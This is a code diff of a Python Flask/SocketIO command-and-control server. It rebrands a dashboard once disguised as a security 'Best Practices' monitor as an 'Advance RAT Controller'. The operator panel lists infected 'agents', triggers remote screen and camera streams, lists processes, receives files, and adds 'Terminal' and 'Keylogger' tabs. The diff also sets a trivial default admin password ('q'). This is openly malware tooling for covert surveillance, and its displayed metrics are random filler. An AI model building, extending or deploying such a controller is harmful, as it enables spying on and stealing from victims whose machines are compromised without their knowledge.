@@ -7,7 +7,6 @@ from flask_socketio import SocketIO, emit, join_room, leave_room
 from collections import defaultdict
 import datetime
 import time
-import random
 import os
 import base64
 import queue
@@ -33,10 +32,10 @@ except ImportError:
 
 # Configuration Management
 class Config:
-    """Configuration class for Neural Control Hub"""
+    """Configuration class for Advance RAT Controller"""
     
     # Admin Authentication
-    ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'Sphinx_Super_Admin_19')
+    ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'q')
     
     # Flask Configuration
     SECRET_KEY = os.environ.get('SECRET_KEY', None)
@@ -109,12 +108,6 @@ WEBRTC_CONFIG = {
 WEBRTC_PEER_CONNECTIONS = {}  # agent_id -> RTCPeerConnection
 WEBRTC_STREAMS = {}  # agent_id -> {screen, audio, camera} streams
 WEBRTC_VIEWERS = {}  # viewer_id -> {agent_id, pc, streams}
-WEBRTC_VIEWER_CONNECTIONS = {}  # viewer_id -> RTCPeerConnection
-
-# Video/Audio Frame Storage
-VIDEO_FRAMES_H264 = defaultdict(lambda: None)
-CAMERA_FRAMES_H264 = defaultdict(lambda: None)
-AUDIO_FRAMES_OPUS = defaultdict(lambda: None)
 
 # Production Scale Configuration
 PRODUCTION_SCALE = {
@@ -839,7 +832,7 @@ def login():
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Neural Control Hub - Login Blocked</title>
+        <title>Advance RAT Controller - Login Blocked</title>
         <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
         <style>
             :root {
@@ -926,7 +919,7 @@ def login():
     <body>
         <div class="login-container">
             <div class="login-header">
-                <h1>NEURAL CONTROL HUB</h1>
+                <h1>Advance RAT Controller</h1>
             </div>
             
             <div class="error-message">
@@ -970,7 +963,7 @@ def login():
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Neural Control Hub - Login</title>
+        <title>Advance RAT Controller - Login</title>
         <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
         <style>
             :root {
@@ -1092,7 +1085,7 @@ def login():
     <body>
         <div class="login-container">
             <div class="login-header">
-                <h1>NEURAL CONTROL HUB</h1>
+                <h1>Advance RAT Controller</h1>
                 <p>Admin Authentication Required</p>
             </div>
             
@@ -1184,7 +1177,7 @@ DASHBOARD_HTML = r'''
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Neural Control Hub — Best Practices Dashboard</title>
+<title>Advance RAT Controller — Best Practices Dashboard</title>
 
 <!-- Fonts & libs -->
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=Orbitron:wght@600;900&display=swap" rel="stylesheet">
@@ -1253,7 +1246,7 @@ DASHBOARD_HTML = r'''
   .top-actions .btn{
     background:transparent;color:var(--muted);border:1px solid rgba(255,255,255,0.03);padding:8px 12px;border-radius:8px;font-weight:600;
   }
-  .top-actions .logout{background:linear-gradient(90deg,var(--accent-a),var(--accent-b));padding:9px 14px;color:#06131a;border:none}
+  .top-actions .logout{background:linear-gradient(90deg,var(--accent-a),var(--accent-b));padding:9px 14px;border-radius:8px}
 
   /* Page layout */
   .page{
@@ -1284,13 +1277,7 @@ DASHBOARD_HTML = r'''
   .agent-list{display:flex;flex-direction:column;gap:10px}
   .agent-item{
     display:flex;align-items:center;justify-content:space-between;padding:12px;border-radius:10px;background:rgba(255,255,255,0.01);
-    border:1px solid rgba(255,255,255,0.02); cursor:pointer; transition:all 0.2s ease;
-  }
-  .agent-item:hover{
-    background:rgba(255,255,255,0.03); border-color:rgba(255,255,255,0.05);
-  }
-  .agent-item.selected{
-    background:rgba(0,212,255,0.08); border-color:rgba(0,212,255,0.3); box-shadow:0 0 12px rgba(0,212,255,0.15);
+    border:1px solid rgba(255,255,255,0.02); cursor:pointer;
   }
   .agent-item .meta{display:flex;gap:10px;align-items:center}
   .agent-bullet{width:12px;height:12px;border-radius:50%}
@@ -1332,20 +1319,8 @@ DASHBOARD_HTML = r'''
 
   /* Videos row inside center */
   .videos{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:10px}
-  .video-card{height:180px;border-radius:10px;background:#000;display:flex;flex-direction:column;overflow:hidden;position:relative}
+  .video-card{height:180px;border-radius:10px;background:#000;display:flex;flex-direction:column;overflow:hidden}
   .video-card video{width:100%;height:100%;object-fit:cover}
-  .video-overlay{position:absolute;top:0;left:0;right:0;bottom:0;background:linear-gradient(180deg,rgba(0,0,0,0.7) 0%,transparent 30%,transparent 70%,rgba(0,0,0,0.7) 100%);pointer-events:none}
-  .video-status{position:absolute;top:8px;left:8px;background:rgba(0,0,0,0.8);color:#fff;padding:4px 8px;border-radius:6px;font-size:0.75rem;font-weight:600}
-  
-  /* WebRTC Controls */
-  .quality-select{padding:6px 8px;border-radius:6px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);color:#fff;font-size:0.85rem}
-  .webrtc-status{display:flex;flex-direction:column;gap:6px;padding:8px;background:rgba(255,255,255,0.02);border-radius:8px;border:1px solid rgba(255,255,255,0.03)}
-  .status-item{display:flex;justify-content:space-between;align-items:center;font-size:0.85rem}
-  .status-label{color:var(--muted)}
-  .status-value{color:#fff;font-weight:600}
-  .status-value.connected{color:#0ee6a6}
-  .status-value.disconnected{color:#ff5c7c}
-  .status-value.warning{color:#ffb84d}
 
   /* Small helpers */
   .muted{color:var(--muted)}
@@ -1368,21 +1343,22 @@ DASHBOARD_HTML = r'''
     <div class="brand">
       <div class="logo">N</div>
       <div style="display:flex;flex-direction:column;line-height:1">
-        <h1>NEURAL CONTROL HUB</h1>
-        <div class="muted small">Best Practices — Live Monitoring</div>
+        <h1>Advance Rat Controller</h1>
+        <div class="muted small">Agent Live Monitoring</div>
       </div>
 
       <div class="nav-tabs" style="margin-left:22px">
-        <div class="nav-tab" onclick="switchTab('overview')">Overview</div>
-        <div class="nav-tab" onclick="switchTab('threats')">Threats</div>
-        <div class="nav-tab active" onclick="switchTab('best-practices')">Best Practices</div>
-        <div class="nav-tab" onclick="switchTab('compliance')">Compliance</div>
+        <div class="nav-tab">Overview</div>
+        <div class="nav-tab">List Process</div>
+        <div class="nav-tab active">Streaming</div>
+        <div class="nav-tab">Terminal</div>
+        <div class="nav-tab">Keylogger</div>
+        
       </div>
     </div>
 
     <div class="top-actions">
-      <div class="small muted">Cluster: <strong style="color:white">Prod-01</strong></div>
-      <button class="btn" onclick="startNewScan()">New Scan</button>
+      <div class="small muted">Agent: <strong style="color:white">45t8ZVUro7QhXlClAAAB</strong></div>
       <a href="/logout" class="logout">Logout</a>
     </div>
   </div>
@@ -1391,50 +1367,18 @@ DASHBOARD_HTML = r'''
 
     <!-- FILTERS -->
     <div class="filters">
-      <div class="filter select" onclick="toggleDropdown('device-group')">
-        Device Group: <strong style="margin-left:8px;color:white" id="selected-device-group">All</strong>
-        <div class="dropdown-content" id="device-group-dropdown">
-          <div class="dropdown-item" onclick="selectDeviceGroup('All')">All</div>
-          <div class="dropdown-item" onclick="selectDeviceGroup('Production')">Production</div>
-          <div class="dropdown-item" onclick="selectDeviceGroup('Development')">Development</div>
-          <div class="dropdown-item" onclick="selectDeviceGroup('Testing')">Testing</div>
-        </div>
-      </div>
-      <div class="filter select" onclick="toggleDropdown('category')">
-        Category: <strong style="margin-left:8px;color:white" id="selected-category">Security</strong>
-        <div class="dropdown-content" id="category-dropdown">
-          <div class="dropdown-item" onclick="selectCategory('Security')">Security</div>
-          <div class="dropdown-item" onclick="selectCategory('Identity')">Identity</div>
-          <div class="dropdown-item" onclick="selectCategory('Network')">Network</div>
-          <div class="dropdown-item" onclick="selectCategory('Service')">Service</div>
-        </div>
-      </div>
-      <div class="filter select" onclick="toggleDropdown('checks')">
-        Checks: <strong style="margin-left:8px;color:white" id="selected-checks">Failed</strong>
-        <div class="dropdown-content" id="checks-dropdown">
-          <div class="dropdown-item" onclick="selectChecks('Failed')">Failed</div>
-          <div class="dropdown-item" onclick="selectChecks('All')">All</div>
-          <div class="dropdown-item" onclick="selectChecks('Passed')">Passed</div>
-          <div class="dropdown-item" onclick="selectChecks('Warning')">Warning</div>
-        </div>
-      </div>
-      <div class="filter select" onclick="toggleDropdown('time-range')">
-        Time Range: <strong style="margin-left:8px;color:white" id="selected-time-range">Last 30 days</strong>
-        <div class="dropdown-content" id="time-range-dropdown">
-          <div class="dropdown-item" onclick="selectTimeRange('Last 7 days')">Last 7 days</div>
-          <div class="dropdown-item" onclick="selectTimeRange('Last 30 days')">Last 30 days</div>
-          <div class="dropdown-item" onclick="selectTimeRange('Last 90 days')">Last 90 days</div>
-          <div class="dropdown-item" onclick="selectTimeRange('Last year')">Last year</div>
-        </div>
-      </div>
+      <div class="filter select">Device Group: <strong style="margin-left:8px;color:white">Online</strong></div>
+      <div class="filter select">Category: <strong style="margin-left:8px;color:white">Security</strong></div>
+      <div class="filter">Checks: <strong style="margin-left:8px;color:white">Failed</strong></div>
+      <div class="filter">Time Range: <strong style="margin-left:8px;color:white">current</strong></div>
       <div class="spacer"></div>
-      <div class="filter small" onclick="exportData()">Export</div>
-      <div class="filter small" onclick="refreshData()">Refresh</div>
+      <div class="filter small">Export</div>
+      <div class="filter small">Refresh</div>
     </div>
 
     <!-- LEFT -->
     <div class="sidebar card">
-      <h3>Active Agents <span class="agent-count" id="agent-count">(0)</span></h3>
+      <h3>Active Agents</h3>
       <div class="agent-list" id="agent-list">
         <!-- JS will populate -->
         <div style="text-align:center;padding:26px;color:var(--muted);border-radius:10px;border:1px dashed rgba(255,255,255,0.02)">
@@ -1442,35 +1386,11 @@ DASHBOARD_HTML = r'''
         </div>
       </div>
 
-      <div class="agent-stats" style="margin-top:16px;padding:12px;background:rgba(255,255,255,0.02);border-radius:8px;border:1px solid rgba(255,255,255,0.03)">
-        <div style="font-weight:600;margin-bottom:8px;color:#fff">Agent Status Summary</div>
-        <div style="display:grid;gap:6px;font-size:0.85rem">
-          <div style="display:flex;justify-content:space-between">
-            <span class="muted">Total Errors:</span>
-            <span class="error-count" id="total-errors">0</span>
-          </div>
-          <div style="display:flex;justify-content:space-between">
-            <span class="muted">Critical:</span>
-            <span class="critical-count" id="critical-errors">0</span>
-          </div>
-          <div style="display:flex;justify-content:space-between">
-            <span class="muted">Warnings:</span>
-            <span class="warning-count" id="warning-errors">0</span>
-          </div>
-          <div style="display:flex;justify-content:space-between">
-            <span class="muted">Info:</span>
-            <span class="info-count" id="info-errors">0</span>
-          </div>
-        </div>
-      </div>
-
       <div class="controls">
-        <input type="hidden" id="agent-id" value="">
         <button class="control-btn primary" onclick="startScreenStream()">Start Screen</button>
         <button class="control-btn" onclick="startCameraStream()">Start Camera</button>
         <button class="control-btn" onclick="listProcesses()">List Processes</button>
         <button class="control-btn" onclick="stopAllStreams()">Stop All</button>
-        <button class="control-btn" onclick="refreshAgentList()">Refresh</button>
       </div>
     </div>
 
@@ -1484,8 +1404,7 @@ DASHBOARD_HTML = r'''
           </div>
           <div class="info">
             <div class="metric-big" id="metric1">23</div>
-            <div class="metric-sub">Rules failing — Unique failed checks</div>
-            <div class="small muted">CSC vs Non-CSC breakdown</div>
+            <div class="metric-sub">Agent Reports</div>
           </div>
         </div>
 
@@ -1495,8 +1414,8 @@ DASHBOARD_HTML = r'''
           </div>
           <div class="info">
             <div class="metric-big" id="metric2">8</div>
-            <div class="metric-sub">Profiles failing</div>
-            <div class="small muted">Highlights most-impactful profiles</div>
+            <div class="metric-sub">Agents Status</div>
+           
           </div>
         </div>
 
@@ -1515,7 +1434,7 @@ DASHBOARD_HTML = r'''
       <!-- Trend chart -->
       <div class="card">
         <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
-          <div style="font-weight:700">Best Practice Trend</div>
+          <div style="font-weight:700">Controller Status</div>
           <div class="muted small">Last 30 days</div>
         </div>
         <div class="trend">
@@ -1523,79 +1442,30 @@ DASHBOARD_HTML = r'''
         </div>
       </div>
 
-      <!-- Videos and WebRTC -->
+      <!-- Videos -->
       <div style="display:flex;gap:12px">
         <div class="card" style="flex:1">
           <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
-            <div style="font-weight:700">Live Streams</div>
-            <div class="muted small">Agent streams</div>
+            <div style="font-weight:700">Live Screen</div>
+            <div class="muted small">Agent stream</div>
           </div>
           <div class="videos">
-            <div class="video-card">
-              <video id="screen-video" autoplay muted playsinline></video>
-              <div class="video-overlay">
-                <div class="video-status" id="screen-status">Screen Stream</div>
-              </div>
-            </div>
-            <div class="video-card">
-              <video id="camera-video" autoplay muted playsinline></video>
-              <div class="video-overlay">
-                <div class="video-status" id="camera-status">Camera Stream</div>
-              </div>
-            </div>
-          </div>
-          
-          <!-- WebRTC Stream Display -->
-          <div style="margin-top:12px">
-            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
-              <div style="font-weight:700">WebRTC Stream</div>
-              <div class="muted small">Low-latency</div>
-            </div>
-            <div class="video-card" style="height:140px">
-              <video id="webrtc-video" autoplay muted playsinline></video>
-              <div class="video-overlay">
-                <div class="video-status" id="webrtc-status">WebRTC Stream</div>
-              </div>
-            </div>
+            <div class="video-card"><video id="screen-video" autoplay muted playsinline></video></div>
+            <div class="video-card"><video id="camera-video" autoplay muted playsinline></video></div>
           </div>
         </div>
 
         <div class="card" style="width:340px">
-          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
-            <div style="font-weight:700">WebRTC Controls</div>
-            <div class="muted small">Low-latency</div>
-          </div>
-          
-          <div style="display:flex;flex-direction:column;gap:8px;margin-bottom:12px">
-            <button class="control-btn primary" onclick="startWebRTCStream()">Start WebRTC</button>
-            <button class="control-btn" onclick="stopWebRTCStream()">Stop WebRTC</button>
-            <button class="control-btn" onclick="getWebRTCStats()">Get Stats</button>
-            
-            <div style="display:flex;gap:8px;align-items:center">
-              <label class="small muted">Quality:</label>
-              <select id="webrtc-quality" class="quality-select" onchange="setWebRTCQuality()">
-                <option value="auto">Auto</option>
-                <option value="high">High</option>
-                <option value="medium">Medium</option>
-                <option value="low">Low</option>
-              </select>
-            </div>
+          <div style="display:flex;justify-content:space-between;align-items:center">
+            <div style="font-weight:700">Quick Metrics</div>
+            <div class="muted small">Real-time</div>
           </div>
 
-          <div style="font-weight:700;margin-bottom:8px">WebRTC Status</div>
-          <div class="webrtc-status" id="webrtc-status">
-            <div class="status-item">
-              <span class="status-label">Connection:</span>
-              <span class="status-value" id="webrtc-connection">Disconnected</span>
-            </div>
-            <div class="status-item">
-              <span class="status-label">Latency:</span>
-              <span class="status-value" id="webrtc-latency">--</span>
-            </div>
-            <div class="status-item">
-              <span class="status-label">Quality:</span>
-              <span class="status-value" id="webrtc-quality-status">--</span>
-            </div>
+          <div class="metric-grid" style="margin-top:12px">
+            <div class="metric-pill"><div class="v" id="m1">12</div><div class="small muted">Active Agents</div></div>
+            <div class="metric-pill"><div class="v" id="m2">3</div><div class="small muted">Active Streams</div></div>
+            <div class="metric-pill"><div class="v" id="m3">95%</div><div class="small muted">Stream Health</div></div>
+            <div class="metric-pill"><div class="v" id="m4">120ms</div><div class="small muted">Avg Latency</div></div>
           </div>
 
           <div style="margin-top:12px;font-weight:700">Output</div>
@@ -1606,19 +1476,6 @@ DASHBOARD_HTML = r'''
 
     <!-- RIGHT -->
     <div class="rightcol">
-      <div class="card">
-        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
-          <div style="font-weight:700">Quick Metrics</div>
-          <div class="muted small">Real-time</div>
-        </div>
-        <div class="metric-grid" style="margin-top:12px">
-          <div class="metric-pill"><div class="v" id="m1">12</div><div class="small muted">Active Agents</div></div>
-          <div class="metric-pill"><div class="v" id="m2">3</div><div class="small muted">Active Streams</div></div>
-          <div class="metric-pill"><div class="v" id="m3">95%</div><div class="small muted">Stream Health</div></div>
-          <div class="metric-pill"><div class="v" id="m4">120ms</div><div class="small muted">Avg Latency</div></div>
-        </div>
-      </div>
-
       <div class="card">
         <div style="display:flex;justify-content:space-between;align-items:center">
           <div style="font-weight:700">Config Status</div>
@@ -1668,91 +1525,6 @@ DASHBOARD_HTML = r'''
     document.getElementById('cfg3').innerText = data.session_timeout + 's';
     document.getElementById('cfg4').innerText = data.blocked_ips.length;
   });
-  
-  // WebRTC event handlers
-  socket.on('webrtc_started', data => {
-    appendLog('WebRTC streaming started for agent: ' + data.agent_id);
-    updateWebRTCStatus('Connected', 'connected');
-    updateMetric('m2', parseInt(document.getElementById('m2').innerText || '0') + 1);
-    
-    // Update WebRTC video status
-    const webrtcStatusEl = document.getElementById('webrtc-status');
-    if(webrtcStatusEl){
-      webrtcStatusEl.textContent = 'Connected';
-      webrtcStatusEl.style.color = '#0ee6a6';
-    }
-  });
-  
-  socket.on('webrtc_stopped', data => {
-    appendLog('WebRTC streaming stopped for agent: ' + data.agent_id);
-    updateWebRTCStatus('Disconnected', 'disconnected');
-    updateMetric('m2', Math.max(0, parseInt(document.getElementById('m2').innerText || '0') - 1));
-    
-    // Update WebRTC video status
-    const webrtcStatusEl = document.getElementById('webrtc-status');
-    if(webrtcStatusEl){
-      webrtcStatusEl.textContent = 'Disconnected';
-      webrtcStatusEl.style.color = '#ff5c7c';
-    }
-  });
-  
-  socket.on('webrtc_stats', data => {
-    appendLog('WebRTC stats received: ' + JSON.stringify(data.stats));
-    if(data.stats.latency) {
-      document.getElementById('webrtc-latency').innerText = data.stats.latency + 'ms';
-    }
-    if(data.stats.quality) {
-      document.getElementById('webrtc-quality-status').innerText = data.stats.quality;
-    }
-  });
-  
-  socket.on('webrtc_error', data => {
-    appendLog('WebRTC error: ' + data.message);
-    updateWebRTCStatus('Error', 'disconnected');
-    
-    // Update WebRTC video status
-    const webrtcStatusEl = document.getElementById('webrtc-status');
-    if(webrtcStatusEl){
-      webrtcStatusEl.textContent = 'Error';
-      webrtcStatusEl.style.color = '#ff5c7c';
-    }
-  });
-
-  // New event handlers for enhanced functionality
-  socket.on('agents_list', data => {
-    if (data.agents) {
-      renderAgentList(data.agents);
-      updateMetrics();
-    }
-  });
-  
-  socket.on('scan_started', data => {
-    appendLog(`Scan started on agent ${data.agent_id}`, 'info');
-  });
-  
-  socket.on('scan_completed', data => {
-    appendLog(`Scan completed on agent ${data.agent_id}`, 'info');
-    updateErrorCounts();
-  });
-  
-  socket.on('data_exported', data => {
-    appendLog(`Data exported successfully: ${data.filename}`, 'success');
-  });
-  
-  socket.on('error_counts_updated', data => {
-    if (data.counts) {
-      const { total, critical, warning, info } = data.counts;
-      const totalEl = document.getElementById('total-errors');
-      const criticalEl = document.getElementById('critical-errors');
-      const warningEl = document.getElementById('warning-errors');
-      const infoEl = document.getElementById('info-errors');
-      
-      if (totalEl) totalEl.textContent = total;
-      if (criticalEl) criticalEl.textContent = critical;
-      if (warningEl) warningEl.textContent = warning;
-      if (infoEl) infoEl.textContent = info;
-    }
-  });
 
   /* --------- Render helpers --------- */
   function appendLog(msg){
@@ -1774,37 +1546,24 @@ DASHBOARD_HTML = r'''
       container.appendChild(item);
     });
   }
-  function selectAgent(id){ 
-    // Remove previous selection
-    document.querySelectorAll('.agent-item').forEach(item => item.classList.remove('selected'));
-    
-    // Add selection to clicked item
-    const selectedItem = document.querySelector(`.agent-item:has(.agent-sub:contains('${id}'))`);
-    if(selectedItem) {
-      selectedItem.classList.add('selected');
-    }
-    
-    // Update agent ID for commands
-    document.getElementById('agent-id')?.setAttribute('value', id); 
-    appendLog('Selected agent '+id); 
-  }
+  function selectAgent(id){ document.getElementById('agent-id')?.setAttribute('value', id); appendLog('Selected agent '+id); }
 
   /* --------- Chart.js: doughnuts + trend --------- */
   const doughnutOpts = {responsive:true, maintainAspectRatio:false, cutout:'70%', plugins:{legend:{display:false}}};
 
   const d1 = new Chart(document.getElementById('doughnut1').getContext('2d'),{
     type:'doughnut',
-    data:{labels:['CSC','Non-CSC','Other'], datasets:[{data:[60,30,10], backgroundColor:[getColor('--accent-a'), getColor('--accent-b'),'rgba(255,255,255,0.06)'], borderWidth:0}]},
+    data:{labels:['error','problems','bugs'], datasets:[{data:[60,30,10], backgroundColor:[getColor('--accent-a'), getColor('--accent-b'),'rgba(255,255,255,0.06)'], borderWidth:0}]},
     options:doughnutOpts
   });
   const d2 = new Chart(document.getElementById('doughnut2').getContext('2d'),{
     type:'doughnut',
-    data:{labels:['High','Medium','Low'], datasets:[{data:[40,30,30], backgroundColor:[getColor('--accent-b'),getColor('--accent-a'),'rgba(255,255,255,0.06)'], borderWidth:0}]},
+    data:{labels:['Online','Recently','Offline'], datasets:[{data:[40,30,30], backgroundColor:[getColor('--accent-b'),getColor('--accent-a'),'rgba(255,255,255,0.06)'], borderWidth:0}]},
     options:doughnutOpts
   });
   const d3 = new Chart(document.getElementById('doughnut3').getContext('2d'),{
     type:'doughnut',
-    data:{labels:['Pass','Fail'], datasets:[{data:[59,41], backgroundColor:['rgba(0,255,190,0.12)','rgba(255,92,124,0.12)'], borderWidth:0}], borderWidth:0}]},
+    data:{labels:['Pass','Fail'], datasets:[{data:[59,41], backgroundColor:['rgba(0,255,190,0.12)','rgba(255,92,124,0.12)'], borderWidth:0}]},
     options:doughnutOpts
   });
 
@@ -1814,8 +1573,8 @@ DASHBOARD_HTML = r'''
     data: {
       labels: Array.from({length:30}, (_,i)=>'Day '+(i+1)),
       datasets: [
-        {label:'Security', data: randomSeries(30,40,85), borderColor:getColor('--accent-a'), tension:0.28, pointRadius:2, fill:false},
-        {label:'Identity', data: randomSeries(30,20,70), borderColor:getColor('--accent-b'), tension:0.28, pointRadius:2, fill:false},
+        {label:'latency', data: randomSeries(30,40,85), borderColor:getColor('--accent-a'), tension:0.28, pointRadius:2, fill:false},
+        {label:'Overall Agents', data: randomSeries(30,20,70), borderColor:getColor('--accent-b'), tension:0.28, pointRadius:2, fill:false},
         {label:'Network', data: randomSeries(30,10,60), borderColor:'#9be8ff', tension:0.28, pointRadius:2, fill:false},
         {label:'Service', data: randomSeries(30,5,55), borderColor:'#7ee3b6', tension:0.28, pointRadius:2, fill:false}
       ]
@@ -1847,70 +1606,6 @@ DASHBOARD_HTML = r'''
   function startCameraStream(){ socket.emit('start_camera_stream'); appendLog('Start camera stream request'); }
   function stopAllStreams(){ socket.emit('stop_all_streams'); appendLog('Stop all streams request'); }
   function stopScreenStream(){ socket.emit('stop_screen_stream'); appendLog('Stop screen stream request'); }
-  
-  /* --------- WebRTC Functions --------- */
-  function startWebRTCStream(){
-    const selectedAgent = getSelectedAgent();
-    if(!selectedAgent){
-      appendLog('No agent selected for WebRTC streaming');
-      return;
-    }
-    socket.emit('webrtc_start_streaming', {agent_id: selectedAgent, stream_type: 'screen'});
-    appendLog('Starting WebRTC streaming for agent: ' + selectedAgent);
-    updateWebRTCStatus('Connecting...', 'warning');
-  }
-  
-  function stopWebRTCStream(){
-    const selectedAgent = getSelectedAgent();
-    if(!selectedAgent){
-      appendLog('No agent selected for WebRTC streaming');
-      return;
-    }
-    socket.emit('webrtc_stop_streaming', {agent_id: selectedAgent});
-    appendLog('Stopping WebRTC streaming for agent: ' + selectedAgent);
-    updateWebRTCStatus('Disconnected', 'disconnected');
-  }
-  
-  function getWebRTCStats(){
-    const selectedAgent = getSelectedAgent();
-    if(!selectedAgent){
-      appendLog('No agent selected for WebRTC stats');
-      return;
-    }
-    socket.emit('webrtc_get_stats', {agent_id: selectedAgent});
-    appendLog('Requesting WebRTC stats for agent: ' + selectedAgent);
-  }
-  
-  function setWebRTCQuality(){
-    const quality = document.getElementById('webrtc-quality').value;
-    const selectedAgent = getSelectedAgent();
-    if(!selectedAgent){
-      appendLog('No agent selected for quality change');
-      return;
-    }
-    socket.emit('webrtc_set_quality', {agent_id: selectedAgent, quality: quality});
-    appendLog('Setting WebRTC quality to: ' + quality + ' for agent: ' + selectedAgent);
-    updateWebRTCStatus('Quality: ' + quality, 'connected');
-  }
-  
-  function updateWebRTCStatus(message, type = 'info'){
-    const statusEl = document.getElementById('webrtc-connection');
-    if(statusEl){
-      statusEl.textContent = message;
-      statusEl.className = 'status-value ' + type;
-    }
-  }
-  
-  function getSelectedAgent(){
-    // Get the currently selected agent ID from the agent list
-    const selectedItem = document.querySelector('.agent-item.selected');
-    if(selectedItem){
-      const agentIdEl = selectedItem.querySelector('.agent-sub');
-      return agentIdEl ? agentIdEl.textContent : null;
-    }
-    return null;
-  }
-  
   function changePassword(){
     const p = document.getElementById('new-pass').value;
     if(!p || p.length<8){ alert('Choose password >= 8 chars'); return; }
@@ -1918,143 +1613,8 @@ DASHBOARD_HTML = r'''
       .then(r=>r.json()).then(j=>{ if(j.success) alert('Password changed'); else alert('Error: '+j.message) }).catch(e=>alert('Error'));
   }
 
-  // Navigation and UI functions
-  function switchTab(tabName) {
-    // Remove active class from all tabs
-    document.querySelectorAll('.nav-tab').forEach(tab => {
-      tab.classList.remove('active');
-    });
-    
-    // Add active class to clicked tab
-    event.target.classList.add('active');
-    
-    // Update content based on tab (placeholder for now)
-    appendLog(`Switched to ${tabName} tab`, 'info');
-  }
-  
-  function startNewScan() {
-    const agentId = getSelectedAgent();
-    if (!agentId) {
-      appendLog('Please select an agent first', 'error');
-      return;
-    }
-    appendLog(`Starting new scan on agent ${agentId}`, 'info');
-    socket.emit('start_scan', { agent_id: agentId });
-  }
-  
-  function toggleDropdown(dropdownId) {
-    const dropdown = document.getElementById(`${dropdownId}-dropdown`);
-    if (dropdown) {
-      dropdown.style.display = dropdown.style.display === 'block' ? 'none' : 'block';
-    }
-  }
-  
-  function selectDeviceGroup(group) {
-    document.getElementById('selected-device-group').textContent = group;
-    document.getElementById('device-group-dropdown').style.display = 'none';
-    appendLog(`Device group changed to: ${group}`, 'info');
-    refreshData();
-  }
-  
-  function selectCategory(category) {
-    document.getElementById('selected-category').textContent = category;
-    document.getElementById('category-dropdown').style.display = 'none';
-    appendLog(`Category changed to: ${category}`, 'info');
-    refreshData();
-  }
-  
-  function selectChecks(checks) {
-    document.getElementById('selected-checks').textContent = checks;
-    document.getElementById('checks-dropdown').style.display = 'none';
-    document.getElementById('checks-dropdown').style.display = 'none';
-    appendLog(`Checks filter changed to: ${checks}`, 'info');
-    refreshData();
-  }
-  
-  function selectTimeRange(timeRange) {
-    document.getElementById('selected-time-range').textContent = timeRange;
-    document.getElementById('time-range-dropdown').style.display = 'none';
-    appendLog(`Time range changed to: ${timeRange}`, 'info');
-    refreshData();
-  }
-  
-  function exportData() {
-    const filters = {
-      deviceGroup: document.getElementById('selected-device-group').textContent,
-      category: document.getElementById('selected-category').textContent,
-      checks: document.getElementById('selected-checks').textContent,
-      timeRange: document.getElementById('selected-time-range').textContent
-    };
-    appendLog(`Exporting data with filters: ${JSON.stringify(filters)}`, 'info');
-    // Placeholder for actual export functionality
-  }
-  
-  function refreshData() {
-    appendLog('Refreshing dashboard data...', 'info');
-    // Refresh agent list
-    refreshAgentList();
-    // Refresh metrics
-    updateMetrics();
-    // Refresh charts
-    updateCharts();
-  }
-  
-  function refreshAgentList() {
-    appendLog('Refreshing agent list...', 'info');
-    socket.emit('get_agents');
-  }
-  
-  function updateMetrics() {
-    // Update quick metrics
-    const activeAgents = document.querySelectorAll('.agent-item').length;
-    const activeStreams = document.querySelectorAll('video[src]').length;
-    
-    // Update the existing metric elements
-    const activeAgentsEl = document.getElementById('m1');
-    const activeStreamsEl = document.getElementById('m2');
-    
-    if (activeAgentsEl) activeAgentsEl.textContent = activeAgents;
-    if (activeStreamsEl) activeStreamsEl.textContent = activeStreams;
-    
-    // Update agent count in sidebar
-    const agentCountEl = document.getElementById('agent-count');
-    if (agentCountEl) agentCountEl.textContent = `(${activeAgents})`;
-  }
-  
-  function updateCharts() {
-    // Placeholder for chart updates
-    appendLog('Charts updated', 'info');
-  }
-  
-  function updateErrorCounts() {
-    // Count different types of errors from agent logs
-    let totalErrors = 0;
-    let criticalErrors = 0;
-    let warningErrors = 0;
-    let infoErrors = 0;
-    
-    // This would typically analyze actual agent data
-    // For now, using placeholder values
-    const totalEl = document.getElementById('total-errors');
-    const criticalEl = document.getElementById('critical-errors');
-    const warningEl = document.getElementById('warning-errors');
-    const infoEl = document.getElementById('info-errors');
-    
-    if (totalEl) totalEl.textContent = totalErrors;
-    if (criticalEl) criticalEl.textContent = criticalErrors;
-    if (warningEl) warningEl.textContent = warningErrors;
-    if (infoEl) infoEl.textContent = infoErrors;
-  }
-
   /* demo: update metrics every 7s */
-  setInterval(()=>{ 
-    updateMetric('metric1', Math.floor(Math.random()*60)); 
-    updateMetric('metric2', Math.floor(Math.random()*40)); 
-    updateMetric('metric3', Math.floor(Math.random()*100)+'%'); 
-    updateMetric('m1', Math.floor(Math.random()*20)); 
-    updateMetrics();
-    updateErrorCounts();
-  },7000);
+  setInterval(()=>{ updateMetric('metric1', Math.floor(Math.random()*60)); updateMetric('metric2', Math.floor(Math.random()*40)); updateMetric('metric3', Math.floor(Math.random()*100)+'%'); updateMetric('m1', Math.floor(Math.random()*20)); },7000);
 
   /* demo: append a start line */
   appendLog('Dashboard ready — waiting for agents');
@@ -2062,27 +1622,8 @@ DASHBOARD_HTML = r'''
 </script>
 </body>
 </html>
-
-
-
-
-
-
-            
-
-
-
-
-
-
-
-
-
-
-
-
-
 '''
+
 
 # In-memory storage for agent data
 AGENTS_DATA = defaultdict(lambda: {"sid": None, "last_seen": None})
@@ -2437,7 +1978,12 @@ def handle_file_chunk_from_agent(data):
             'total_size': total_size
         }, room='operators')
 
-
+# Global variables for WebRTC and video streaming
+WEBRTC_PEER_CONNECTIONS = {}
